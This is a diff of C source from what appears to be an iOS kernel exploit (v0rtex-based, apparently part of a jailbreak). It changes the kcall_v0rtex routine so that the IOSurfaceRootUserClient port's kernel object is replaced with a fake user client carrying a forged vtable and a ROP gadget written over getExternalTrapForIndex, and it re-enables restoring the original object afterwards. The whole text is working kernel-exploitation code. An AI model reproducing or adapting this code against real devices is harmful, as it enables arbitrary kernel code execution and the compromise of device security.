@@ -318,9 +318,6 @@ uint64_t kcall_v0rtex(uint64_t fptr, uint64_t args[7]) {
         // Write our fake vtable into the fake user client
         wk64(fake_client, fake_vtable);
 
-        // Replace the user client with ours
-        wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
-
         // Now the userclient port we have will look into our fake user client rather than the old one
 
         uint64_t find_add_x0_x0_0x40_ret(void);
@@ -329,6 +326,9 @@ uint64_t kcall_v0rtex(uint64_t fptr, uint64_t args[7]) {
 
         printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
     }
+
+    // Replace the user client with ours
+    wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
 
     // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
     // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
@@ -360,11 +360,9 @@ uint64_t kcall_v0rtex(uint64_t fptr, uint64_t args[7]) {
           args[5],
           args[6]);
 
-    return err;
-
     // cleanup
-#if 0
     wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
-#endif
+
+    return err;
 }
 
